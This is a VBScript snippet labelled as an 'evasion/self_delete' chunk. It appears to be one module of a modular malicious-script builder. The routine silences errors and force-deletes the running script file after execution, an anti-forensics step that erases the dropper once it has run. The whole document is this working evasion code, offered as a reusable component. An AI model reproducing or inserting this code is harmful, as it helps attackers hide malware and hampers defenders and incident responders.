' chunk: evasion/self_delete
' depends: (none)
' provides: self_cleanup
' format: vbscript
' note: Delete the running script file after execution

Sub self_cleanup()
    On Error Resume Next
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    fso.DeleteFile WScript.ScriptFullName, True
End Sub
